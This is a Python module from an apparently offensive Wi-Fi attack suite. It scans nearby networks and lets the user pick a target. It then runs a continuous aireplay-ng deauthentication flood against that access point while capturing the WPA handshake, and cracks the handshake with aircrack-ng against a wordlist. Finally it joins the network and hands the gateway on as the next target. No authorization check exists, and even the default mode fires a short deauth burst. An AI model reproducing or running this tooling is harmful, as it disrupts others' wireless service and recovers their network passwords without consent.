# modules/wifi_discovery/module.py
"""
Fusion-AI // Wireless Operations Core Subsystem (Hybrid & Offensive Suite)
Enterprise Open-Source & Commercial Infrastructure Auditing Plugin.
"""

import os
import re
import csv
import sys
import shutil
import time
import subprocess
from datetime import datetime 
from typing import Any, Dict, List, Optional
from core.types import Finding, Severity

def _execute_subsystem_cmd(command: List[str], timeout: int = 15) -> str:
    try:
        result = subprocess.run(
            command, capture_output=True, text=True, timeout=timeout, check=False
        )
        return result.stdout.strip() if result.returncode == 0 else ""
    except (OSError, subprocess.TimeoutExpired):
        return ""

def purge_historical_pipeline_cache():
    target_artifacts = [
        "outputs/json/report.json", "outputs/report.json",
        "outputs/wifi_dump-01.csv", "outputs/wifi_dump.csv"
    ]
    for artifact in target_artifacts:
        try:
            if os.path.exists(artifact): os.remove(artifact)
        except Exception: pass

def discover_interfaces() -> List[Dict[str, Any]]:
    if not shutil.which("iw"): return []
    output = _execute_subsystem_cmd(["iw", "dev"])
    interfaces = []
    current = None
    for raw in output.splitlines():
        line = raw.strip()
        if line.startswith("Interface "):
            if current: interfaces.append(current)
            current = {"name": line.split("Interface ", 1)[1].strip(), "type": None, "mac": None}
        elif current:
            if line.startswith("type "): current["type"] = line.split("type ", 1)[1].strip()
            elif line.startswith("addr "): current["mac"] = line.split("addr ", 1)[1].strip()
    if current: interfaces.append(current)
    return interfaces

def scan_visible_networks(interface: str) -> List[Dict[str, Any]]:
    networks = []
    seen = set()
    scan_duration = 120 
    output_prefix = "outputs/wifi_dump"
    csv_file = "outputs/wifi_dump-01.csv"
    
    if os.path.exists(csv_file):
        try: os.remove(csv_file)
        except Exception: pass

    print(f"\n[📡] RADAR IGNITION: Deploying airodump-ng core over {interface}...")
    print(f"[*] Sweeping wireless frequencies for {scan_duration} seconds. Analyzing airspace...")

    if shutil.which("airodump-ng"):
        cmd = ["sudo", "airodump-ng", "--write", output_prefix, "--output-format", "csv", interface]
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(scan_duration)
            proc.terminate()
            proc.wait()
        except Exception as e:
            print(f"[❌] Subprocess Error: Hardware interface rejection: {e}")
            return []

    if os.path.exists(csv_file):
        try:
            with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                reader = csv.reader(f)
                in_ap_section = False
                for row in reader:
                    if not row: continue
                    if "BSSID" in row:
                        in_ap_section = True
                        continue
                    if in_ap_section and "Station MAC" in row: break
                    
                    if in_ap_section and len(row) >= 14:
                        bssid, channel, signal, privacy, ssid = row[0].strip(), row[3].strip(), row[8].strip(), row[5].strip(), row[13].strip()
                        if not bssid or bssid == "BSSID" or len(bssid) != 17: continue
                        key = (ssid, bssid)
                        if key in seen: continue
                        seen.add(key)
                        networks.append({
                            "in_use": False, "ssid": ssid if ssid else "<Hidden Infrastructure>",
                            "bssid": bssid, "channel": channel if channel else "?",
                            "signal": signal if signal else "-99", "security": privacy if privacy else "Open"
                        })
        except Exception as e:
            print(f"[❌] Parser Error: Data streaming failure: {e}")

    return sorted(networks, key=lambda x: int(x["signal"]) if x["signal"].replace("-","").strip().isdigit() else -99, reverse=True)

def choose_network(networks: List[Dict[str, Any]]) -> Optional[Dict[str, Any]]:
    if not networks:
        print("\n[⚠] Operational Matrix: Zero accessible wireless structures found.")
        return None
    print("\n" + "═" * 85)
    print(" 📡 FUSION-AI // WIRELESS TARGET SELECTION MATRIX")
    print("═" * 85)
    print(f" {'ID':<4} {'STAT':<4} {'TARGET AP ESSID':<30} {'BSSID TARGET':<18} {'CHAN':<5} {'RSSI':<6} {'SECURITY'}")
    print("-" * 85)
    for index, network in enumerate(networks, start=1):
        print(f" [{index:02d}]  🎯  {network.get('ssid'):<30} {network.get('bssid'):<18} {network.get('channel', '?'):<5} {network.get('signal', '?') + ' dBm':<6} {network.get('security')}")
    print("═" * 85)
    while True:
        try:
            selection = input("\n[🎯] Select target index to engage or 'Q' to abort: ").strip()
        except (KeyboardInterrupt, EOFError): return None
        if selection.lower() == 'q': return None
        if not selection.isdigit(): continue
        number = int(selection)
        if 1 <= number <= len(networks): return networks[number - 1]
def launch_deauth_attack(bssid: str, channel: str, interface: str, duration: int = 60):
    """
    💥 ASYNCHRONOUS OFFENSIVE WI-FI ATTACK ENGINE
    Lanza de forma paralela el monitor de captura y el ataque continuo,
    garantizando que no existan micro-lags en la recepción del Handshake.
    """
    print(f"\n[⚔️] LOCKING ANTENNA HARDWARE MATRIX ON BSSID: [{bssid}] | CHANNEL: [{channel}]")
    
    # 1. Fijar el canal de forma rígida en la antena
    _execute_subsystem_cmd(["sudo", "iwconfig", interface, "channel", channel])
    time.sleep(1)

    output_prefix = "outputs/handshake_capture"
    cap_file = f"{output_prefix}-01.cap"
    
    # Limpieza absoluta de la caché de captura previa
    for ext in ["-01.cap", "-01.csv", "-01.kismet.csv", "-01.kismet.netxml"]:
        file_to_clean = f"{output_prefix}{ext}"
        if os.path.exists(file_to_clean):
            try: os.remove(file_to_clean)
            except Exception: pass

    if not shutil.which("airodump-ng") or not shutil.which("aireplay-ng"):
        print("[❌] Critical Error: Aircrack-ng binaries are missing from PATH.")
        return

    # 📡 2. LANZAR EL CAPTURADOR (AIRODUMP-NG) EN UN HILO INDEPENDIENTE Y SEGURO
    # Lo forzamos a escuchar únicamente el canal y el BSSID objetivo para maximizar la velocidad de captura
    dump_cmd = [
        "sudo", "airodump-ng", 
        "--bssid", bssid, 
        "--channel", channel, 
        "--write", output_prefix, 
        "--output-format", "csv,cap", 
        interface
    ]
    
    print("[●] Synchronizing background capture stream (Airodump-ng)...")
    dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2) # Buffer de estabilización del hardware

    # 💣 3. LANZAR EL ATAQUE CONTINUO (AIREPLAY-NG) EN SEGUNDO PLANO
    # Usamos el parámetro de ráfaga continua (ej: lanza ataques constantes sin detenerse)
    # Enviamos una ráfaga masiva inicial para obligar a los clientes a soltar la sesión
    deauth_cmd = [
        "sudo", "aireplay-ng", 
        "--deauth", "0", # "0" significa ataque continuo e ininterrumpido en la suite oficial
        "-a", bssid, 
        interface
    ]
    
    print("[🔥] Igniting continuous multi-client deauthentication broadcast pipeline...")
    print("─" * 80)
    
    try:
        # Arranca el bombardeo continuo en su propio subproceso aislado
        attack_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Mientras el ataque corre en paralelo, Python simplemente pinta el segundero en pantalla
        # Así el auditor sabe cuánto falta y no sobrecargamos la antena con llamadas repetitivas
        start_time = time.time()
        while time.time() - start_time < duration:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            timestamp = datetime.now().strftime('%H:%M:%S')
            
            # Animación cyberpunk elegante en una sola línea para mantener limpia la consola
            sys.stdout.write(f"\r [{timestamp}] [OFFENSIVE] Air Space Saturated ──> Remaining Attack Window: {remaining:02d}s | Monitoring EAPOL Handshakes...")
            sys.stdout.flush()
            time.sleep(1)
            
        print("\n" + "─" * 80)
        print("[*] Timeline threshold reached. Demobilizing offensive processes...")
        
        # 4. Detener los procesos en el orden correcto
        attack_proc.terminate()
        attack_proc.wait()
        time.sleep(1) # Pequeño respiro para que termine de escribir las últimas tramas al disco
        
        dump_proc.terminate()
        dump_proc.wait()
        
    except Exception as e:
        print(f"\n[❌] Runtime Exception during parallel attack: {e}")
        try: attack_proc.terminate()
        except Exception: pass
        try: dump_proc.terminate()
        except Exception: pass

    # 📊 5. VALIDACIÓN CIENTÍFICA DEL LEDGER EN DISCO
    if os.path.exists(cap_file) and os.path.getsize(cap_file) > 4000: # Un archivo .cap con handshake pesa más de 4KB
        print(f"[✔] CAPTURE ledger validated successfully at: {cap_file}")
    else:
        print("[⚠] RECON WARNING: Capture threshold unverified. Air space did not yield clean EAPOL packets.")


def execute_local_cracking(bssid: str):
    """
    🧮 MATHEMATICAL CRACKING ENGINE
    Invocación directa de aircrack-ng de forma local para auditar contraseñas débiles.
    """
    cap_file = "outputs/handshake_capture-01.cap"
    wordlist = "/usr/share/wordlists/dirb/common.txt" # Fallback local integrado o rockyou.txt
    
    if not os.path.exists(cap_file):
        print("[❌] Cracking Aborted: Captured packet ledger file missing from disk.")
        return

    print(f"\n[🧬] INITIALIZING MATHEMATICAL CRACKING LAYER AGAINST AP: {bssid}")
    print(f"[*] Querying local cryptographic dictionaries...")

    if shutil.which("aircrack-ng"):
        cmd = ["sudo", "aircrack-ng", "-b", bssid, "-w", wordlist, cap_file]
        # Dejamos que aircrack-ng pinte toda su interfaz nativa en la terminal en tiempo real
        subprocess.run(cmd)
    else:
        print("[❌] Dependency Missing: 'aircrack-ng' binary not found in local system PATH.")


def run(mode: str = "0", context=None) -> Dict[str, Any]:
    """
    ⚡ RECON & ATTACK SUBSYSTEM IGNITION ENGINE
    Maneja de forma modular y unificada la opción 0 (Híbrida) y la opción 8 (Ofensiva).
    """
    from datetime import datetime
    purge_historical_pipeline_cache()

    interfaces = discover_interfaces()
    if not interfaces:
        return {"available": False, "interfaces": [], "active_network": None, "networks": [], "target": None, "status": "NO_WIRELESS_INTERFACE"}

    interface_name = "wlan0" # Target directo asignado a tu hardware físico Realtek
    networks = scan_visible_networks(interface_name)

    selected = choose_network(networks)
    if selected is None:
        return {"available": True, "interfaces": interfaces, "active_network": None, "networks": networks, "selected_network": None, "target": None, "status": "OPERATIONAL_ABORT_BY_USER"}
    # ================================================================
    # 📡 WIFI INVENTORY -> FUSION-AI FINDING / LIVE DASHBOARD
    # ================================================================
    network_lines = []

    for idx, network in enumerate(networks, start=1):
        network_lines.append(
            f"[{idx:02d}] "
            f"SSID={network.get('ssid', '<Hidden Infrastructure>')} | "
            f"BSSID={network.get('bssid', 'N/A')} | "
            f"CHANNEL={network.get('channel', '?')} | "
            f"RSSI={network.get('signal', '?')} dBm | "
            f"SECURITY={network.get('security', 'Unknown')}"
        )

    all_networks_description = (
        f"Wireless infrastructure discovery completed. "
        f"{len(networks)} visible network(s) detected.\n\n"
        "SELECTED NETWORK:\n"
        f"SSID={selected.get('ssid', 'N/A')} | "
        f"BSSID={selected.get('bssid', 'N/A')} | "
        f"CHANNEL={selected.get('channel', '?')} | "
        f"RSSI={selected.get('signal', '?')} dBm | "
        f"SECURITY={selected.get('security', 'Unknown')}\n\n"
        "ALL DISCOVERED NETWORKS:\n" +
        "\n".join(network_lines)
    )

    wifi_finding = Finding(
        module="WIFI_DISCOVERY", # Forzamos mayúsculas para mantener la simetría con [NMAP]
        finding_type="wireless_network_discovery",
        title=f"📡 Wireless Network Selected: {selected.get('ssid', '<Hidden Infrastructure>')}",
        severity=Severity.INFO,
        data={
            "selected_network": selected,
            "networks": networks,
            "network_count": len(networks)
        },
        description=all_networks_description,
        remediation="Review discovered wireless infrastructure and verify that all identified networks are authorized and appropriately secured."
    )

    # Publish exactly like the other modules' Finding events.
    try:
        from core.live_sync import live_sync_bus
        live_sync_bus.publish_finding(wifi_finding)
    except Exception as e:
        logger = None
        print(f"[⚠] Wi-Fi live dashboard synchronization unavailable: {e}")

    target_bssid = selected["bssid"]
    target_channel = selected["channel"]

    # 🎛️ ACCIONAMIENTO SEGÚN LA SELECCIÓN DEL MENÚ PRINCIPAL
    if mode == "8":
        # MODO OFENSIVO PURO (Opción 8)
        launch_deauth_attack(target_bssid, target_channel, interface_name, duration=120)
        execute_local_cracking(target_bssid)
        
        # 🤝 PROMPT INTERACTIVO COMERCIAL ELITE
        print("\n" + "═" * 70)
        print(" 🎉 WIRELESS OFFENSIVE MATRIX OPERATIONS CONCLUDED")
        print("═" * 70)
        try:
            proceed = input("[?] Do you want to cascade into the infrastructure vulnerability pipeline? (y/N): ").strip().lower()
        except (KeyboardInterrupt, EOFError): proceed = "n"
        
        if proceed != "y" and proceed != "s":
            print("\n[-] Operational exit dispatched. Returning control safely to Kali.")
            sys.exit(0)

    else:
        # MODO HÍBRIDO AUTOMATIZADO (Opción 0)
        # Ataque rápido de deautenticación de 8 segundos para registrar evidencia en el dashboard
        launch_deauth_attack(target_bssid, target_channel, interface_name, duration=8)

    # ================================================================
    # PIVOTE AUTOMÁTICO DE REGRESO A MODO ENRUTAMIENTO IP
    # ================================================================
    print("\n[*] SUITE PIVOT -> Deactivating monitor layer to restore local network sockets...")
    _execute_subsystem_cmd(["sudo", "airmon-ng", "stop", interface_name])
    _execute_subsystem_cmd(["sudo", "ip", "link", "set", interface_name, "up"])
    
    # 🔐 SOLICITUD DE ASOCIACIÓN COMERCIAL AUTOMATIZADA
    if selected and selected.get("ssid") and selected["ssid"] != "<Hidden Infrastructure>":
        print(f"\n[?] Corporate Audit Gateway: Preparing infrastructure association with network: {selected['ssid']}")
        try:
            wifi_password = input("[?] Enter the Wi-Fi pre-shared key (Password) or press Enter to skip: ").strip()
            if wifi_password:
                print(f"[*] Authenticating and associating hardware to {selected['ssid']}...")
                # Usamos nmcli para conectarnos de forma nativa e inalámbrica al módem del cliente
                _execute_subsystem_cmd(["sudo", "nmcli", "dev", "wifi", "connect", selected['ssid'], "password", wifi_password], timeout=15)
        except (KeyboardInterrupt, EOFError):
            print("\n[-] Skipping automated association phase.")

    print("\n[*] SUITE PIVOT -> Negotiating dynamic IP allocation via infrastructure DHCP...")
    subprocess.run(["sudo", "dhclient", interface_name], timeout=12, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)

    # Captura dinámica en caliente de la tabla de enrutamiento del Kernel de Linux
    target_host = None
    if shutil.which("ip"):
        try:
            route_output = _execute_subsystem_cmd(["ip", "route", "show", "default", "dev", interface_name])
            match = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", route_output)
            if match: target_host = match.group(1)
        except Exception: pass

    # 🚨 FALLBACK MANUAL DE COMPATIBILIDAD COMERCIAL
    if not target_host:
        print("\n[⚠] Network Warning: DHCP lease completed, but local gateway is unreachable.")
        try:
            target_host = input("[?] Enter the target infrastructure IP manually (e.g., 192.168.1.254): ").strip()
        except (KeyboardInterrupt, EOFError): target_host = "127.0.0.1"

    if not target_host:
        target_host = "127.0.0.1"

    # ================================================================
    # FUSION-AI -> WIFI DISCOVERY EVIDENCE CARD
    # ================================================================
    wifi_matrix = "\n".join(
        f"[{i:02d}]  🎯  "
        f"{network.get('ssid', '<Hidden Infrastructure>'):<30} "
        f"{network.get('bssid', 'N/A'):<18} "
        f"{network.get('channel', '?'):<5} "
        f"{network.get('signal', '?')} dBm  "
        f"{network.get('security', 'Unknown')}"
        for i, network in enumerate(networks, start=1)
    )

    wifi_finding = {
        "module": "wifi_discovery",
        "type": "wireless_discovery",
        "title": f"Wireless Network Discovered: {selected.get('ssid', 'Unknown')}",
        "severity": "info",
        "description": (
            "FUSION-AI // WIRELESS TARGET SELECTION MATRIX\n\n"
            "ID   STAT TARGET AP ESSID                BSSID TARGET       CHAN  RSSI   SECURITY\n"
            "-------------------------------------------------------------------------------------\n"
            + wifi_matrix
        ),
        "remediation": "Review wireless security configuration and authorized network exposure.",
        "data": {
            "networks": networks,
            "selected_network": selected
        }
    }

    return {
        "available": True,
        "interfaces": [{"name": interface_name, "type": "managed", "mac": "7c:8b:ca:0b:24:cb"}],
        "active_network": {"connection": selected["ssid"]},
        "local_network": {"ip": "Dynamic", "gateway": target_host},
        "networks": networks,
        "selected_network": selected,
        "finding": wifi_finding,
        "target": target_host,
        "status": "TARGET_READY"
    }
